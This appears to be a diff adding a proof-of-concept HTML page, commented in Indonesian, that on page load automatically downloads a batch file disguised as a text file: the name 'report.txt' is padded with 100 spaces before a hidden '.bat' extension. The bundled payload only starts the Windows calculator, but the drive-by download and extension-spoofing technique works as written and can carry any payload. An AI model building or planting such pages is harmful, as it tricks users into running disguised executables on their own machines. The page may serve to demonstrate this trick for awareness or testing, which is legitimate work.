@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Fake Text File Download</title>
+    <style>
+      body {
+        background-color: #000;
+        color: #0f0;
+        font-family: monospace;
+        text-align: center;
+        padding: 50px;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Processing file... Please wait</h1>
+
+    <script>
+      // Fungsi padding angka 0 di depan waktu
+      function pad(n) {
+        return n < 10 ? "0" + n : n;
+      }
+
+      // Waktu sekarang untuk nama file
+      const now = new Date();
+      const fileName = `report.txt` + " ".repeat(100) + `.bat`; // Disamarkan
+
+      // Isi payload .bat
+      const batPayload = `@echo off\r\nstart calc.exe`;
+
+      // Buat blob
+      const blob = new Blob([batPayload], { type: "application/octet-stream" });
+
+      // Buat elemen link untuk unduh
+      const link = document.createElement("a");
+      link.href = URL.createObjectURL(blob);
+      link.download = fileName;
+
+      // Auto-click
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    </script>
+  </body>
+</html>
